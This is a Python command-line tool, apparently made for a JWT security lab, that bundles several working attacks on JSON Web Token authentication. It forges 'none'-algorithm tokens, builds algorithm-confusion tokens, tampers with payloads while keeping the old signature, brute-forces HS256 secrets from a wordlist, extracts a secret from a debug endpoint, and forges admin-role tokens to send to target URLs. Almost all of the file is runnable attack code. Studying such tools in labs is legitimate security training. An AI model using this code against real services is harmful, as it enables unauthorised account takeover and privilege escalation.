#!/usr/bin/env python3
"""
JWT Lab - All-In-One Exploit Tool

This script combines all JWT vulnerability exploits into a single tool.
"""

import jwt
import json
import base64
import sys
import time
import requests
import argparse
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

# Banner
BANNER = """
       _  _    _  _____   _____               _  
      | || |  | ||_   _| |  ___|             | | 
      | || |__| |  | |   | |____  ___ __  ___| |_
  _   |__   __  |  | |   |  __\ \/ / '_ \/ __| __|
 | |____ | || |  _| |_  | |___>  <| |_) \__ \ |_ 
  \____/ |_||_| |_____| \____/_/\_\ .__/|___/\__|
                                  | |            
                                  |_|            

  JWT Vulnerability All-In-One Exploitation Tool
  Lab Version 1.0
"""

def decode_token_parts(token):
    """Decode a JWT token into its parts without verification."""
    try:
        # Split the token into its parts
        parts = token.split('.')
        if len(parts) != 3:
            print("[-] Invalid token format")
            return None, None, None
        
        # Decode the header
        header_bytes = base64.urlsafe_b64decode(parts[0] + "=" * ((4 - len(parts[0]) % 4) % 4))
        header = json.loads(header_bytes.decode('utf-8'))
        
        # Decode the payload
        payload_bytes = base64.urlsafe_b64decode(parts[1] + "=" * ((4 - len(parts[1]) % 4) % 4))
        payload = json.loads(payload_bytes.decode('utf-8'))
        
        return header, payload, parts[2]  # Return header, payload, and signature
    
    except Exception as e:
        print(f"[-] Error decoding token: {e}")
        return None, None, None

def print_decoded_token(token):
    """Print a decoded JWT token in a readable format."""
    header, payload, signature = decode_token_parts(token)
    
    if not header or not payload:
        print("[-] Failed to decode token")
        return
    
    print("\n=== Token Decoded ===")
    print("\nHeader:")
    print(json.dumps(header, indent=2))
    
    print("\nPayload:")
    print(json.dumps(payload, indent=2))
    
    print("\nSignature:")
    print(signature)
    
    # Check for potential weak points
    print("\n=== Security Analysis ===")
    
    # Check algorithm
    if "alg" in header:
        if header["alg"] == "none":
            print("[-] CRITICAL: Token uses 'none' algorithm (no signature verification)")
        elif header["alg"] == "HS256":
            print("[*] Uses HS256 algorithm (symmetric)")
        elif header["alg"] == "RS256":
            print("[*] Uses RS256 algorithm (asymmetric)")
    
    # Check expiration
    if "exp" in payload:
        expiration = payload["exp"]
        now = int(time.time())
        if expiration < now:
            print(f"[-] Token is expired (since {time.ctime(expiration)})")
        else:
            print(f"[*] Token expires at: {time.ctime(expiration)}")
    else:
        print("[-] WARNING: No expiration time set")
    
    # Check sensitive data
    sensitive_fields = ["password", "secret", "key", "token", "auth"]
    for field in sensitive_fields:
        for key in payload:
            if field.lower() in key.lower():
                print(f"[-] WARNING: Potentially sensitive data in '{key}' field")

def create_none_algorithm_token(payload):
    """Create a token with 'none' algorithm (no signature)."""
    # Create a header with 'none' algorithm
    header = {
        "alg": "none",
        "typ": "JWT"
    }
    
    # Encode header and payload
    header_bytes = json.dumps(header, separators=(',', ':')).encode('utf-8')
    header_b64 = base64.urlsafe_b64encode(header_bytes).decode('utf-8').rstrip('=')
    
    payload_bytes = json.dumps(payload, separators=(',', ':')).encode('utf-8')
    payload_b64 = base64.urlsafe_b64encode(payload_bytes).decode('utf-8').rstrip('=')
    
    # Create token with empty signature (important: keep the trailing dot)
    token = f"{header_b64}.{payload_b64}."
    
    return token

def create_confused_algorithm_token(secret, payload):
    """Create a token with algorithm confusion."""
    # Create token using the symmetric secret but with RS256 in the header
    token = jwt.encode(
        payload,
        secret,  # Using the secret as the key
        algorithm="HS256",  # Actually using HS256
        headers={"alg": "RS256"}  # But claiming it's RS256
    )
    
    return token

def modify_token_payload(token, modifications):
    """Modify a token's payload without changing the signature."""
    header, payload, signature = decode_token_parts(token)
    
    if not header or not payload or not signature:
        return None
    
    # Apply modifications to the payload
    for key, value in modifications.items():
        payload[key] = value
    
    # Encode the header and modified payload
    header_bytes = json.dumps(header, separators=(',', ':')).encode('utf-8')
    header_b64 = base64.urlsafe_b64encode(header_bytes).decode('utf-8').rstrip('=')
    
    payload_bytes = json.dumps(payload, separators=(',', ':')).encode('utf-8')
    payload_b64 = base64.urlsafe_b64encode(payload_bytes).decode('utf-8').rstrip('=')
    
    # Create modified token with original signature
    modified_token = f"{header_b64}.{payload_b64}.{signature}"
    
    return modified_token

def fetch_secret_from_debug(debug_url):
    """Fetch JWT secret from the debug endpoint."""
    try:
        print(f"[*] Accessing debug endpoint: {debug_url}")
        response = requests.get(debug_url)
        
        if response.status_code == 200:
            data = response.json()
            
            # Try to extract the secret
            if 'config' in data and 'jwtSecret' in data['config']:
                secret = data['config']['jwtSecret']
                print(f"[+] Successfully extracted JWT secret: {secret}")
                return secret
            else:
                print("\n[*] Debug endpoint response:")
                print(json.dumps(data, indent=2))
                return None
        else:
            print(f"[-] Failed to access debug endpoint: {response.status_code}")
            return None
    except Exception as e:
        print(f"[-] Error fetching secret: {e}")
        return None

def forge_token_with_secret(secret, username="user", role="admin"):
    """Forge a token with the given secret."""
    payload = {
        "userId": "1234567890",
        "username": username,
        "role": role,
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600  # 1 hour from now
    }
    
    token = jwt.encode(payload, secret, algorithm="HS256")
    return token

def brute_force_jwt(token, wordlist_path, max_attempts=None):
    """Brute force the secret key using a wordlist."""
    start_time = time.time()
    attempts = 0
    
    try:
        with open(wordlist_path, 'r') as wordlist:
            for line in wordlist:
                secret = line.strip()
                attempts += 1
                
                if max_attempts and attempts > max_attempts:
                    print(f"\n[*] Reached maximum attempts ({max_attempts})")
                    break
                
                if attempts % 500 == 0:
                    elapsed = time.time() - start_time
                    print(f"[*] Tried {attempts} secrets... ({attempts/elapsed:.2f} attempts/sec)")
                
                try:
                    # Try to decode the token with the current secret
                    decoded = jwt.decode(token, secret, algorithms=["HS256"])
                    elapsed = time.time() - start_time
                    print(f"\n[+] SUCCESS! Secret found: '{secret}'")
                    print(f"[+] Attempts: {attempts} ({attempts/elapsed:.2f} attempts/sec)")
                    print(f"[+] Decoded token: {decoded}")
                    return secret
                
                except jwt.InvalidSignatureError:
                    # Wrong secret, continue to next one
                    continue
                except jwt.ExpiredSignatureError:
                    # If the token has expired, but the signature is valid
                    print(f"\n[+] SUCCESS! Secret found: '{secret}' (Token expired)")
                    print(f"[+] Attempts: {attempts}")
                    return secret
                except Exception:
                    # Other error, skip this secret
                    continue
        
        print(f"\n[-] Secret not found after {attempts} attempts")
        return None
    
    except FileNotFoundError:
        print(f"[-] Wordlist file not found: {wordlist_path}")
        return None
    except KeyboardInterrupt:
        print(f"\n[-] Brute force interrupted after {attempts} attempts")
        return None

def test_endpoint(url, token):
    """Test an endpoint with a given token."""
    try:
        print(f"[*] Testing endpoint: {url}")
        headers = {"Authorization": f"Bearer {token}"}
        response = requests.get(url, headers=headers)
        
        print(f"[+] Response status code: {response.status_code}")
        
        if response.headers.get('content-type') and 'application/json' in response.headers.get('content-type'):
            print("[+] Response body:")
            try:
                print(json.dumps(response.json(), indent=2))
            except:
                print(response.text)
        else:
            print("[+] Response body:")
            print(response.text[:500] + ("..." if len(response.text) > 500 else ""))
        
        return response
    except Exception as e:
        print(f"[-] Error testing endpoint: {e}")
        return None

def scan_all_vulnerabilities(base_url, token=None):
    """Scan all vulnerabilities in the API."""
    endpoints = [
        "/api/none-alg",
        "/api/alg-confusion",
        "/api/missing-validation",
        "/api/debug"
    ]
    
    results = {}
    
    # First, check if we can get a secret from debug endpoint
    secret = fetch_secret_from_debug(f"{base_url}/api/debug")
    if secret:
        results["secret_leak"] = True
        
        # If we have the secret, forge an admin token
        if not token:
            token = forge_token_with_secret(secret, role="admin")
            print(f"[+] Forged admin token: {token}")
    else:
        results["secret_leak"] = False
    
    if not token:
        print("[-] No token available for testing. Please provide a token with --token.")
        return results
    
    # Try the none algorithm attack
    print("\n=== Testing None Algorithm Attack ===")
    header, payload, _ = decode_token_parts(token)
    if header and payload:
        none_token = create_none_algorithm_token(payload)
        print(f"[+] Generated 'none' algorithm token: {none_token}")
        none_response = test_endpoint(f"{base_url}/api/none-alg", none_token)
        results["none_algorithm"] = none_response and none_response.status_code == 200
    
    # Try algorithm confusion attack
    if secret:
        print("\n=== Testing Algorithm Confusion Attack ===")
        confused_token = create_confused_algorithm_token(secret, {"role": "admin", "username": "user"})
        print(f"[+] Generated algorithm confusion token: {confused_token}")
        confusion_response = test_endpoint(f"{base_url}/api/alg-confusion", confused_token)
        results["alg_confusion"] = confusion_response and confusion_response.status_code == 200
    
    # Try signature bypass attack
    print("\n=== Testing Signature Bypass Attack ===")
    if header and payload:
        modified_payload = payload.copy()
        modified_payload["role"] = "admin"
        tampered_token = modify_token_payload(token, {"role": "admin"})
        print(f"[+] Generated tampered token: {tampered_token}")
        tamper_response = test_endpoint(f"{base_url}/api/missing-validation", tampered_token)
        results["signature_bypass"] = tamper_response and tamper_response.status_code == 200
    
    # Print summary
    print("\n=== Vulnerability Scan Results ===")
    for vuln, is_vulnerable in results.items():
        status = "VULNERABLE" if is_vulnerable else "NOT VULNERABLE"
        print(f"[*] {vuln.replace('_', ' ').title()}: {status}")
    
    return results

def parse_args():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description='JWT Vulnerability All-In-One Exploitation Tool')
    
    # Main command argument
    parser.add_argument('command', choices=[
        'decode', 'none', 'tamper', 'brute', 'extract', 'forge', 'test', 'scan'
    ], help='Command to execute')
    
    # Common arguments
    parser.add_argument('--token', '-t', help='JWT token to work with')
    parser.add_argument('--url', '-u', help='Target URL')
    
    # Command-specific arguments
    parser.add_argument('--secret', '-s', help='JWT secret for token forgery')
    parser.add_argument('--field', '-f', help='Field name to modify when tampering')
    parser.add_argument('--value', '-v', help='New value for the field when tampering')
    parser.add_argument('--username', help='Username for forged tokens')
    parser.add_argument('--role', default='admin', help='Role for forged tokens (default: admin)')
    parser.add_argument('--wordlist', '-w', help='Wordlist file for brute force attack')
    parser.add_argument('--max-attempts', type=int, help='Maximum number of brute force attempts')
    
    return parser.parse_args()

def main():
    print(BANNER)
    args = parse_args()
    
    if args.command == 'decode':
        if not args.token:
            print("[-] Please provide a token with --token")
            sys.exit(1)
        print_decoded_token(args.token)
    
    elif args.command == 'none':
        # Create a token with 'none' algorithm
        payload = {"role": "admin", "username": args.username or "user"}
        none_token = create_none_algorithm_token(payload)
        print(f"[+] Generated 'none' algorithm token: {none_token}")
        
        if args.url:
            print(f"\n[*] Testing token against URL: {args.url}")
            test_endpoint(args.url, none_token)
    
    elif args.command == 'tamper':
        if not args.token:
            print("[-] Please provide a token with --token")
            sys.exit(1)
        
        if not args.field:
            print("[-] Please provide a field to modify with --field")
            sys.exit(1)
        
        if args.value is None:
            print("[-] Please provide a new value with --value")
            sys.exit(1)
        
        # Try to convert value to appropriate type
        value = args.value
        if value.lower() == "true":
            value = True
        elif value.lower() == "false":
            value = False
        elif value.isdigit():
            value = int(value)
        
        tampered_token = modify_token_payload(args.token, {args.field: value})
        if tampered_token:
            print(f"[+] Tampered token: {tampered_token}")
            
            if args.url:
                print(f"\n[*] Testing tampered token against URL: {args.url}")
                test_endpoint(args.url, tampered_token)
    
    elif args.command == 'brute':
        if not args.token:
            print("[-] Please provide a token with --token")
            sys.exit(1)
        
        if not args.wordlist:
            print("[-] Please provide a wordlist with --wordlist")
            sys.exit(1)
        
        print(f"[*] Starting JWT brute force attack...")
        print(f"[*] Token: {args.token}")
        print(f"[*] Wordlist: {args.wordlist}")
        
        secret = brute_force_jwt(args.token, args.wordlist, args.max_attempts)
        
        if secret and args.url:
            print(f"\n[*] Testing forged token with discovered secret")
            token = forge_token_with_secret(secret, args.username or "user", args.role)
            print(f"[+] Forged token: {token}")
            test_endpoint(args.url, token)
    
    elif args.command == 'extract':
        if not args.url:
            print("[-] Please provide a debug URL with --url")
            sys.exit(1)
        
        secret = fetch_secret_from_debug(args.url)
        
        if secret:
            print(f"[+] Extracted JWT secret: {secret}")
    
    elif args.command == 'forge':
        if not args.secret:
            print("[-] Please provide a secret with --secret")
            sys.exit(1)
        
        token = forge_token_with_secret(args.secret, args.username or "user", args.role)
        print(f"[+] Forged token: {token}")
        
        if args.url:
            print(f"\n[*] Testing forged token against URL: {args.url}")
            test_endpoint(args.url, token)
    
    elif args.command == 'test':
        if not args.url:
            print("[-] Please provide a URL with --url")
            sys.exit(1)
        
        if not args.token:
            print("[-] Please provide a token with --token")
            sys.exit(1)
        
        test_endpoint(args.url, args.token)
    
    elif args.command == 'scan':
        if not args.url:
            print("[-] Please provide a base URL with --url")
            sys.exit(1)
        
        scan_all_vulnerabilities(args.url, args.token)

if __name__ == "__main__":
    main()